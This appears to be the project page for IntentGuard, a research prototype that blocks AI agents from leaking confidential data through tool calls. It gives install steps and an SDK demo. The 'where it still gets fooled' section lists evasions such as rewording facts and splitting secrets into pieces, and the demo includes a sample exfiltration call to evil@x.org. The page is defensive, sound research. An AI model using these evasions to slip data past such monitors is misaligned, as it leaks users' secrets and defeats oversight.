No hiding

Where it still gets fooled

Reworded factsReworded facts get through.

A rounded figure, another language, slang, or a comparison with no numbers is not recognised. 5 of 14 attacks in the newest set are known misses.

Split secretsThe first short piece can leave.

A secret sent in pieces is caught once the whole becomes recognisable, as the replay shows. The first short piece has already gone.

EvidenceNo independent test yet.

Every attack set shares an author with the engine. An outside set is the next step for the evidence.

FrictionSome legitimate work waits for a person.

About 4.5% of steps on the held-out generated set go to a human, and a legitimate email that repeats a sensitive number will too.

ComparisonNot compared with the real systems.

Progent, The Task Shield and CaMeL appear only as stand-ins that capture one idea each.

ScopeMock tools only.

Everything here ran on synthetic tools. Network-level isolation of a real agent is not verified.

The full list, with the measurements behind each, is in docs/findings.md.

Hands on

Run it yourself

terminal
git clone https://github.com/Kaushik2210/IntentGuard.git
cd IntentGuard
pip install -e ".[dev]"
intentguard serve --demo        # http://127.0.0.1:8000
python -m pytest -q
python
from intentguard.sdk import Guard

guard = Guard(classes={"hr/salary.csv": "CONFIDENTIAL"}, trust={"bob@x.org": "approved"})

@guard.tool("read", resource_arg="path")
def read_file(path): ...

@guard.tool("send", dest_arg="to")
def send_email(to, body): ...

session = guard.session("Read notes/a.txt and email bob@x.org a summary",
                        {"resources": ["notes/*"], "destinations": ["bob@x.org"]})
session.call("send_email", to="evil@x.org", body="...")   # blocked, with the reason

IntentGuard is a research prototype, not a product, and has not been audited. Built from commit 951b1a2. The replay, the flying packets and the audit ledger come from the real engine through site/build_site.py; the compose box is a tested port of one rule. The page loads no third-party scripts and sends nothing anywhere.
